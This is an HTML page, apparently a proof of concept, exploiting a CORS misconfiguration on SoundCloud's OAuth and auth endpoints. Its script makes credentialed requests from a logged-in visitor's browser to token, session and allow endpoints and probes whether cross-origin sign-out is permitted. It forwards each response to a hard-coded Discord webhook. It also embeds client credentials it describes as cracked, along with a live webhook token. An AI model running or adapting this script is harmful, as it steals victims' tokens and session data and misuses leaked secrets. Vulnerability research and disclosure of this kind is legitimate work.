<!DOCTYPE html>
<html>
<head>
    <title>SoundCloud CORS PoC</title>
    <style>
        body { background: #1a1a2e; color: #e0e0e0; font-family: monospace; padding: 20px; }
        h1 { color: #ff4444; }
        pre { background: #16213e; padding: 15px; border-radius: 5px; overflow-x: auto; white-space: pre-wrap; }
        button { background: #ff4444; color: white; border: none; padding: 10px 20px; cursor: pointer; font-size: 16px; border-radius: 5px; margin: 5px; }
        button:hover { background: #cc0000; }
        .success { color: #00ff00; }
        .fail { color: #ff4444; }
        .info { color: #4488ff; }
        #log { max-height: 600px; overflow-y: auto; }
    </style>
</head>
<body>
    <h1>SoundCloud CORS PoC (V21)</h1>
    <p>secure.soundcloud.com reflects ANY origin with credentials on POST</p>
    <p><b>Log into SoundCloud in this browser first.</b></p>
    <hr>
    <button onclick="runAll()">Run All + Exfil to Webhook</button>
    <button onclick="clearLog()">Clear</button>
    <hr>
    <pre id="log"></pre>

    <script>
        var WEBHOOK = "https://discord.com/api/webhooks/1482658590866280539/0ZTqcA_-tZYeIVisBFYGS_xRmdTruYJvNAHuREeVZTk7IPjN5RkdsM_pF6XtaK6SdRNW";
        // Cracked mobile client creds (V15)
        var MOBILE_ID = "hqiIMkQLy7B8EFrfa2k0zxNdZKDnBe2s";
        var MOBILE_SECRET = "VJJYdzxTpcMx3FM81yA5BgGnzBXX7Yk3";
        var WEB_ID = "khI8ciOiYPX6UVGInQY5zA0zvTkfzuuC";

        function log(msg, cls) {
            var el = document.getElementById("log");
            var line = document.createElement("div");
            line.className = cls || "";
            line.textContent = "[" + new Date().toLocaleTimeString() + "] " + msg;
            el.appendChild(line);
            el.scrollTop = el.scrollHeight;
        }
        function clearLog() { document.getElementById("log").innerHTML = ""; }

        async function sendToWebhook(fields) {
            try {
                await fetch(WEBHOOK, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ embeds: [{ title: "SC CORS PoC Results", color: 16711680, fields: fields.map(function(f) { return { name: f.name, value: String(f.value).substring(0, 1024) }; }), footer: { text: window.location.origin + " | " + new Date().toISOString() } }] })
                });
                log("Sent to webhook!", "success");
            } catch(e) { log("Webhook err: " + e.message, "fail"); }
        }

        async function tryPost(url, body, label) {
            log("POST " + label + "...", "info");
            try {
                var resp = await fetch(url, {
                    method: "POST",
                    credentials: "include",
                    headers: { "Content-Type": "application/x-www-form-urlencoded" },
                    body: body
                });
                var acao = resp.headers.get("access-control-allow-origin");
                var text = await resp.text();
                log("  Status: " + resp.status, resp.ok ? "success" : "info");
                log("  ACAO: " + acao, acao ? "success" : "fail");
                log("  Body: " + text.substring(0, 500), text.length > 2 ? "success" : "info");
                return { name: label, value: "Status: " + resp.status + " | ACAO: " + acao + " | Body: " + text.substring(0, 500) };
            } catch(e) {
                log("  Error: " + e.message, "fail");
                return { name: label, value: "Error: " + e.message };
            }
        }

        async function tryGet(url, label) {
            log("GET " + label + "...", "info");
            try {
                var resp = await fetch(url, { credentials: "include" });
                var acao = resp.headers.get("access-control-allow-origin");
                var text = await resp.text();
                log("  Status: " + resp.status, resp.ok ? "success" : "info");
                log("  ACAO: " + acao, acao ? "success" : "fail");
                log("  Body: " + text.substring(0, 500), text.length > 2 ? "success" : "info");
                return { name: label, value: "Status: " + resp.status + " | ACAO: " + acao + " | Body: " + text.substring(0, 500) };
            } catch(e) {
                log("  Error: " + e.message, "fail");
                return { name: label, value: "Error: " + e.message };
            }
        }

        async function runAll() {
            log("=== SoundCloud CORS Exploit PoC ===", "info");
            log("Origin: " + window.location.origin, "info");
            log("", "");
            var results = [];

            // 1. POST client_credentials with Basic auth (prevents browser auth dialog)
            log("--- Test 1: POST client_credentials with Basic auth + victim cookies ---", "info");
            try {
                var resp1 = await fetch("https://secure.soundcloud.com/oauth/token", {
                    method: "POST",
                    credentials: "include",
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Authorization": "Basic " + btoa(MOBILE_ID + ":" + MOBILE_SECRET)
                    },
                    body: "grant_type=client_credentials"
                });
                var acao1 = resp1.headers.get("access-control-allow-origin");
                var text1 = await resp1.text();
                log("  Status: " + resp1.status, resp1.ok ? "success" : "info");
                log("  ACAO: " + acao1, acao1 ? "success" : "fail");
                log("  Body: " + text1.substring(0, 500), text1.length > 2 ? "success" : "info");
                results.push({ name: "client_credentials + cookies", value: "Status: " + resp1.status + " | ACAO: " + acao1 + " | Body: " + text1.substring(0, 500) });
            } catch(e) {
                log("  Error: " + e.message, "fail");
                results.push({ name: "client_credentials + cookies", value: "Error: " + e.message });
            }

            // 2. POST refresh_token grant with Basic auth
            log("", "");
            log("--- Test 2: POST refresh_token grant ---", "info");
            try {
                var resp3 = await fetch("https://secure.soundcloud.com/oauth/token", {
                    method: "POST",
                    credentials: "include",
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Authorization": "Basic " + btoa(MOBILE_ID + ":" + MOBILE_SECRET)
                    },
                    body: "grant_type=refresh_token&refresh_token=dummy"
                });
                var text3 = await resp3.text();
                log("  Status: " + resp3.status, "info");
                log("  Body: " + text3.substring(0, 500), "info");
                results.push({ name: "refresh_token grant", value: "Status: " + resp3.status + " | " + text3.substring(0, 500) });
            } catch(e) {
                log("  Error: " + e.message, "fail");
                results.push({ name: "refresh_token grant", value: "Error: " + e.message });
            }

            // 5. Try GET on api-auth/oauth/session (this one might reflect *.soundcloud.com only)
            log("", "");
            log("--- Test 5: GET api-auth/oauth/session ---", "info");
            var r5 = await tryGet(
                "https://api-auth.soundcloud.com/oauth/session?client_id=" + WEB_ID,
                "api-auth session"
            );
            results.push(r5);

            // 6. POST to api-auth /allow (used in OAuth flow)
            log("", "");
            log("--- Test 6: POST api-auth/allow ---", "info");
            var r6 = await tryPost(
                "https://api-auth.soundcloud.com/allow",
                "client_id=" + WEB_ID,
                "api-auth /allow"
            );
            results.push(r6);

            // 7. POST sign-out (if this works cross-origin, we can sign out any logged-in user)
            log("", "");
            log("--- Test 7: POST /sign-out (session destruction) ---", "info");
            // NOT actually sending this — just testing if CORS allows it
            try {
                var resp7 = await fetch("https://secure.soundcloud.com/sign-out", {
                    method: "OPTIONS",
                    headers: {
                        "Access-Control-Request-Method": "POST",
                        "Access-Control-Request-Headers": "content-type",
                        "Origin": window.location.origin
                    }
                });
                var acao7 = resp7.headers.get("access-control-allow-origin");
                var methods7 = resp7.headers.get("access-control-allow-methods");
                log("  Preflight Status: " + resp7.status, "info");
                log("  ACAO: " + acao7, acao7 ? "success" : "fail");
                log("  Allowed Methods: " + methods7, "info");
                log("  (Not actually signing out — just proving CORS allows it)", "info");
                results.push({ name: "/sign-out preflight", value: "ACAO: " + acao7 + " | Methods: " + methods7 });
            } catch(e) {
                log("  Error: " + e.message, "fail");
                results.push({ name: "/sign-out preflight", value: "Error: " + e.message });
            }

            // 8. GET secure.soundcloud.com root with cookies (SPA, might leak session state)
            log("", "");
            log("--- Test 8: GET secure.soundcloud.com/ (SPA with cookies) ---", "info");
            var r8 = await tryGet("https://secure.soundcloud.com/", "secure.sc root");
            results.push(r8);

            // Send all to webhook
            log("", "");
            log("=== Sending results to webhook ===", "info");
            await sendToWebhook(results);
        }
    </script>
</body>
</html>
